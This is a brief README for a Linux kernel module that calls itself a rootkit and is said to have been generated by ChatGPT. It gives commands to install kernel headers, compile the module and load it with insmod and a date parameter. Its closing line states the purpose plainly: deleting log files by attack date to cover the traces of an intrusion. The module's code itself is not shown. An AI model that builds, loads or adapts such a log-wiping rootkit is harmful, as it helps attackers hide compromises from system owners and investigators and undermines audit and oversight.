# Linux-Kernel-Rootkit-Log-Deletion-Module
ChatGPT created module which deletes selected log files by date

sudo apt-get install linux-headers-$(uname -r)

gcc -o log_cleaner.o -c log_cleaner.c -I /lib/modules/$(uname -r)/build/include

make -C /lib/modules/$(uname -r)/build M=$(pwd) modules

sudo insmod log_cleaner.ko date="2022-01-01"



This is a Linux Kernel Rootkit so be careful
TO USED TO DELETE LOGFILES BY ATTACK DATE
